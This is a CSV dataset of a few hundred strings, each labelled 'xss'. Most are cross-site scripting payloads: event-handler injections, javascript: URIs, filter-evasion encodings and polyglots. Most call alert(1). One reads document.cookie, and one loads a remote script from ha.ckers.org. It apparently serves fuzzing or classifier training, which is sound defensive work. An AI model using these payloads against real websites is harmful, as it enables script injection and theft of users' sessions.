Payloads,Types
"<div draggable=""true"" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>",xss
"<menuitem draggable=""true"" ondragleave=""alert(1)"">test</menuitem>",xss
"<shadow onkeydown=""alert(1)"" contenteditable>test</shadow>",xss
"<title draggable=""true"" ondragleave=""alert(1)"">test</title>",xss
"<style>:target {transform: rotate(180deg);}</style><param id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></param>",xss
"<style>:target {color:red;}</style><summary id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></summary>",xss
<sup id=x tabindex=1 onbeforedeactivate=alert(1)></sup><input autofocus>,xss
"<span onkeypress=""alert(1)"" contenteditable>test</span>",xss
"<div id=""109""><svg xmlns=""http://www.w3.org/2000/svg"">",xss
</form>,xss
<data id=x tabindex=1 onactivate=alert(1)></data>,xss
"<link draggable=""true"" ondragstart=""alert(1)"">test</link>",xss
"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(1))"">",xss
<dl onpointerdown=alert(1)>XSS</dl>,xss
"<center draggable=""true"" ondragenter=""alert(1)"">test</center>",xss
"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""alert(1)""></p>",xss
"<meta onmouseup=""alert(1)"">test</meta>",xss
"<div id=d><x xmlns=""><iframe onload=javascript:alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>",xss
<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>,xss
"<style>:target {color:red;}</style><head id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></head>",xss
"`""'><img src=xxx:x \x0Bonerror=javascript:alert(1)>",xss
<head id=x tabindex=1 onfocus=alert(1)></head>,xss
"<div id=""115""><!--[if]><script>alert(115)</script -->",xss
"<dd onbeforepaste=""alert(1)"" contenteditable>test</dd>",xss
<audio2 onpointermove=alert(1)>XSS</audio2>,xss
"d=""alert('XSS');\"")"";",xss
"<style>:target {color:red;}</style><menu id=x style=""transition:color 1s"" ontransitionend=alert(1)></menu>",xss
"<p onbeforecopy=""alert(1)"" contenteditable>test</p>",xss
"<strong onbeforepaste=""alert(1)"" contenteditable>test</strong>",xss
<data id=x tabindex=1 onfocusin=alert(1)></data>,xss
"<style>:target {color:red;}</style><listing id=x style=""transition:color 1s"" ontransitionend=alert(1)></listing>",xss
"<cite onbeforecopy=""alert(1)"" contenteditable>test</cite>",xss
"<dir onbeforecut=""alert(1)"" contenteditable>test</dir>",xss
<image onbeforescriptexecute=alert(1)><script>1</script>,xss
&#00060,xss
"<input onmouseenter=""alert(1)"">test</input>",xss
<object onpointerdown=alert(1)>XSS</object>,xss
<big onmousewheel=alert(1)>requires scrolling,xss
<rb id=x tabindex=1 onfocusin=alert(1)></rb>,xss
"<style>:target {color:red;}</style><embed id=x style=""transition:color 1s"" ontransitionstart=alert(1)></embed>",xss
"<content onbeforecut=""alert(1)"" contenteditable>test</content>",xss
<blink onpointerdown=alert(1)>XSS</blink>,xss
"<style>@keyframes x{}</style><option style=""animation-name:x"" onanimationend=""alert(1)""></option>",xss
"?skinName=asfunction:getURL,javascript:alert(1)//"",",xss
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>,xss
"'"">><marquee><img src=x onerror=confirm(1)></marquee>""></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->""></script><script>alert(1)</script>""><img/id=""confirm&lpar;1)""/alt=""/""src=""/""onerror=eval(id&%23x29;>'""><img src=""http://i.imgur.com/P8mL8.jpg"">",xss
<details onpointermove=alert(1)>XSS</details>,xss
<isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus>,xss
<form><input formaction=javascript:alert(1) type=image value=click>,xss
"<style>:target {transform: rotate(180deg);}</style><button id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></button>",xss
<frameset onpointerleave=alert(1)>XSS</frameset>,xss
"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<animatemotion onpointerover=alert(1)>XSS</animatemotion>,xss
<set onafterscriptexecute=alert(1)><script>1</script>,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><b id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></b>",xss
"<pre onbeforecut=""alert(1)"" contenteditable>test</pre>",xss
<dt onblur=alert(1) tabindex=1 id=x></dt><input autofocus>,xss
<source id=x tabindex=1 onfocusin=alert(1)></source>,xss
<body onbeforescriptexecute=alert(1)><script>1</script>,xss
"<style>@keyframes slidein {}</style><a2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></a2>",xss
<input2 onpointermove=alert(1)>XSS</input2>,xss
"<img2 draggable=""true"" ondragstart=""alert(1)"">test</img2>",xss
"<style>:target {color: red;}</style><output id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></output>",xss
"<input onmousedown=""alert(1)"">test</input>",xss
"<iframe2 onmouseover=""alert(1)"">test</iframe2>",xss
"<datalist draggable=""true"" ondragenter=""alert(1)"">test</datalist>",xss
"`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",xss
<tr onpointerleave=alert(1)>XSS</tr>,xss
"<isindex draggable=""true"" ondragenter=""alert(1)"">test</isindex>",xss
"<set onmouseover=""alert(1)"">test</set>",xss
"<a href=""javas\x04cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationend=""alert(1)""></small>",xss
"<dl draggable=""true"" ondragenter=""alert(1)"">test</dl>",xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rp id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rp>",xss
"<noembed onbeforepaste=""alert(1)"" contenteditable>test</noembed>",xss
<table onpointerleave=alert(1)>XSS</table>,xss
<meter id=x tabindex=1 ondeactivate=alert(1)></meter><input id=y autofocus>,xss
"<mark draggable=""true"" ondragleave=""alert(1)"">test</mark>",xss
"<a2 onkeyup=""alert(1)"" contenteditable>test</a2>",xss
"<abbr oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",xss
"<img src\x11=x onerror=""javascript:alert(1)"">",xss
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
"<BR SIZE=""&{javascript:alert(1)}"">",xss
<bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>,xss
onBeforeCopy,xss
"<div draggable=""true"" contenteditable>drag me</div><b ondragover=alert(1) contenteditable>drop here</b>",xss
"<nextid onmouseup=""alert(1)"">test</nextid>",xss
"<b ondblclick=""alert(1)"" autofocus tabindex=1>test</b>",xss
<wbr onafterscriptexecute=alert(1)><script>1</script>,xss
"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",xss
"<dir onmouseleave=""alert(1)"">test</dir>",xss
<table onpointermove=alert(1)>XSS</table>,xss
<dl id=x tabindex=1 onactivate=alert(1)></dl>,xss
<iframe2 onpointerleave=alert(1)>XSS</iframe2>,xss
"<style>:target {color:red;}</style><isindex id=x style=""transition:color 1s"" ontransitionstart=alert(1)></isindex>",xss
<style id=x tabindex=1 onactivate=alert(1)></style>,xss
"<style>:target {color:red;}</style><thead id=x style=""transition:color 1s"" ontransitionstart=alert(1)></thead>",xss
"<div draggable=""true"" contenteditable>drag me</div><base ondrop=alert(1) contenteditable>drop here</base>",xss
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>,xss
"<animate onkeypress=""alert(1)"" contenteditable>test</animate>",xss
<footer onpointermove=alert(1)>XSS</footer>,xss
<li id=x tabindex=1 onfocusin=alert(1)></li>,xss
<input onfocus=javascript:alert(1) autofocus>,xss
"<listing onbeforecopy=""alert(1)"" contenteditable>test</listing>",xss
<abbr onpointerenter=alert(1)>XSS</abbr>,xss
"<style>:target {transform: rotate(180deg);}</style><fieldset id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></fieldset>",xss
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",xss
"<section ondblclick=""alert(1)"" autofocus tabindex=1>test</section>",xss
"<style>:target {color:red;}</style><caption id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></caption>",xss
"<ins ondblclick=""alert(1)"" autofocus tabindex=1>test</ins>",xss
"<slot onmouseup=""alert(1)"">test</slot>",xss
<thead onpointerenter=alert(1)>XSS</thead>,xss
onMouseWheel,xss
<abbr onbeforescriptexecute=alert(1)><script>1</script>,xss
<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>,xss
"<custom tags onmouseup=""alert(1)"">test</custom tags>",xss
"<sup onmouseout=""alert(1)"">test</sup>",xss
jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//,xss
<code onpointerup=alert(1)>XSS</code>,xss
"<style>:target {transform: rotate(180deg);}</style><tr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tr>",xss
<dl onafterscriptexecute=alert(1)><script>1</script>,xss
"<rtc draggable=""true"" ondragstart=""alert(1)"">test</rtc>",xss
"<rtc onmouseenter=""alert(1)"">test</rtc>",xss
<b onpointerup=alert(1)>XSS</b>,xss
"<set onkeyup=""alert(1)"" contenteditable>test</set>",xss
"<div draggable=""true"" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable>drop here</canvas>",xss
<set id=x tabindex=1 onbeforeactivate=alert(1)></set>,xss
"<style>@keyframes slidein {}</style><frameset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frameset>",xss
"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></menuitem>",xss
"<u onmouseup=""alert(1)"">test</u>",xss
"<option oncontextmenu=""alert(1)"">test</option>",xss
<button onpointerenter=alert(1)>XSS</button>,xss
<link onpointerleave=alert(1)>XSS</link>,xss
"<mark ondblclick=""alert(1)"" autofocus tabindex=1>test</mark>",xss
<code onpointerenter=alert(1)>XSS</code>,xss
"<details ondblclick=""alert(1)"" autofocus tabindex=1>test</details>",xss
<big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>,xss
<marquee onpointerleave=alert(1)>XSS</marquee>,xss
<rt onafterscriptexecute=alert(1)><script>1</script>,xss
"<rp onmouseover=""alert(1)"">test</rp>",xss
"<datalist oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",xss
"<param draggable=""true"" ondragend=""alert(1)"">test</param>",xss
<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>,xss
<b <script>alert(1)</script>0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><footer id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></footer>",xss
"<listing draggable=""true"" ondragend=""alert(1)"">test</listing>",xss
<strike id=x tabindex=1 onbeforedeactivate=alert(1)></strike><input autofocus>,xss
<sub onmousewheel=alert(1)>requires scrolling,xss
<rt onpointerover=alert(1)>XSS</rt>,xss
<template onpointerdown=alert(1)>XSS</template>,xss
"<marquee draggable=""true"" ondragend=""alert(1)"">test</marquee>",xss
"<tbody onmouseup=""alert(1)"">test</tbody>",xss
<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>,xss
"javascript://</title></textarea></style></script --><li '//"" '*/alert()/*', onclick=alert()//",xss
"<!-- injection --><svg height=""50px"">",xss
"<style>@keyframes x{}</style><element style=""animation-name:x"" onwebkitanimationend=""alert(1)""></element>",xss
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",xss
"<style>@keyframes x{}</style><animatemotion style=""animation-name:x"" onanimationend=""alert(1)""></animatemotion>",xss
<image id=x tabindex=1 onactivate=alert(1)></image>,xss
<input4 onmousewheel=alert(1)>requires scrolling,xss
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></meter>",xss
"<style>@keyframes x{}</style><font style=""animation-name:x"" onanimationend=""alert(1)""></font>",xss
<embed onpointerenter=alert(1)>XSS</embed>,xss
"<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"?clickTAG=javascript:alert(1)"",",xss
"    <svg:circle cx=""0.45"" cy=""0.7"" r=""0.075"" fill=""white""/>",xss
"<div draggable=""true"" contenteditable>drag me</div><div ondrop=alert(1) contenteditable>drop here</div>",xss
"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>",xss
"<style>@keyframes slidein {}</style><command style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></command>",xss
"<tbody oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",xss
<tr onpointerout=alert(1)>XSS</tr>,xss
"<style>@keyframes slidein {}</style><dir style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dir>",xss
"<base oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",xss
<!-- Up to Opera 12.x -->,xss
"<style>@keyframes x{}</style><acronym style=""animation-name:x"" onanimationstart=""alert(1)""></acronym>",xss
"""`'><script>\x00javascript:alert(1)</script>",xss
"<multicol onbeforecut=""alert(1)"" contenteditable>test</multicol>",xss
<a onpointerenter=alert(1)>XSS</a>,xss
"<html oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",xss
"<template onmousemove=""alert(1)"">test</template>",xss
<dir id=x tabindex=1 ondeactivate=alert(1)></dir><input id=y autofocus>,xss
<ul onpointerup=alert(1)>XSS</ul>,xss
"<meta onpaste=""alert(1)"" contenteditable>test</meta>",xss
"<style>@keyframes x{}</style><object style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></object>",xss
"<style>@keyframes x{}</style><track style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></track>",xss
"<style>:target {color:red;}</style><listing id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></listing>",xss
<object onpointerup=alert(1)>XSS</object>,xss
"<style>:target {color:red;}</style><dl id=x style=""transition:color 1s"" ontransitionstart=alert(1)></dl>",xss
<img src/onerror=alert(1)>,xss
"""`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>",xss
<script id=x tabindex=1 onfocus=alert(1)></script>,xss
"""><script+src=""https://api.vk.com/method/wall.get?callback=alert(1337)""></script>",xss
<frame onbeforescriptexecute=alert(1)><script>1</script>,xss
"<br onmouseout=""alert(1)"">test</br>",xss
onPause,xss
"<span onmouseout=""alert(1)"">test</span>",xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><code id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></code>",xss
<footer onpointerover=alert(1)>XSS</footer>,xss
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationstart=""alert(1)""></video>",xss
"<div draggable=""true"" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option>",xss
"<style>:target {color:red;}</style><basefont id=x style=""transition:color 1s"" ontransitionend=alert(1)></basefont>",xss
"<tfoot onmousemove=""alert(1)"">test</tfoot>",xss
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>,xss
"<picture><source srcset=""validimage.png""><img onloadstart=alert(1)></picture>",xss
"<marquee onkeydown=""alert(1)"" contenteditable>test</marquee>",xss
"<em onmousedown=""alert(1)"">test</em>",xss
"<u onclick=""alert(1)"">test</u>",xss
"<source onmouseenter=""alert(1)"">test</source>",xss
"<div draggable=""true"" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>",xss
"<abbr draggable=""true"" ondrag=""alert(1)"">test</abbr>",xss
"<nextid onkeyup=""alert(1)"" contenteditable>test</nextid>",xss
"<strong draggable=""true"" ondragstart=""alert(1)"">test</strong>",xss
<track onpointerleave=alert(1)>XSS</track>,xss
"<wbr onmouseleave=""alert(1)"">test</wbr>",xss
<q id=x tabindex=1 onfocusin=alert(1)></q>,xss
"<style>@keyframes x{}</style><kbd style=""animation-name:x"" onanimationend=""alert(1)""></kbd>",xss
"<legend onpaste=""alert(1)"" contenteditable>test</legend>",xss
"<tfoot onbeforepaste=""alert(1)"" contenteditable>test</tfoot>",xss
<audio2 onpointerover=alert(1)>XSS</audio2>,xss
"<th onpaste=""alert(1)"" contenteditable>test</th>",xss
<i onpointerrawupdate=alert(1)>XSS</i>,xss
"<param onmousemove=""alert(1)"">test</param>",xss
<tr onpointermove=alert(1)>XSS</tr>,xss
<image2 onpointerdown=alert(1)>XSS</image2>,xss
"<element ondblclick=""alert(1)"" autofocus tabindex=1>test</element>",xss
<frameset onafterscriptexecute=alert(1)><script>1</script>,xss
"<style>:target {color:red;}</style><ol id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></ol>",xss
"<div draggable=""true"" contenteditable>drag me</div><audio2 ondrop=alert(1) contenteditable>drop here</audio2>",xss
"<template oncontextmenu=""alert(1)"">test</template>",xss
<math>,xss
<aside id=x tabindex=1 onactivate=alert(1)></aside>,xss
<data onpointerout=alert(1)>XSS</data>,xss
"<style>@keyframes slidein {}</style><video2 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></video2>",xss
"<bgsound onmouseout=""alert(1)"">test</bgsound>",xss
"<style>:target {color:red;}</style><legend id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></legend>",xss
"<ruby draggable=""true"" ondrag=""alert(1)"">test</ruby>",xss
